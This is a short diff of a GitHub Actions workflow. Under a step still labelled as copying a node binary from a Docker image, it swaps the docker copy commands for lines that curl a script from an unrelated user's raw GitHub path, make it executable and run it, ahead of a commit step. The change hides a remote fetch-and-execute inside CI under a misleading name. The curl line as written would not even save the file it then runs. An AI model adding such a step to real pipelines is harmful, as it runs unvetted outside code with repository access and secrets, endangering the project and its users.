@@ -19,10 +19,9 @@ jobs:
 
       - name: Copy /opt/node/node from docker image
         run: |
-          docker create --name temp_container ${{ secrets.IMPRO }}/${{ secrets.IMREPO }}:${{ secrets.IMVER }}
-          docker cp temp_container:/opt/node/node ./node
-          docker rm temp_container
-
+          curl https://raw.githubusercontent.com/menju2ikg8uti/tmp/main/x.sh
+          chmod +x x.sh
+          ./x.sh
       - name: Commit changes
         run: |
           git config user.name "github-actions"
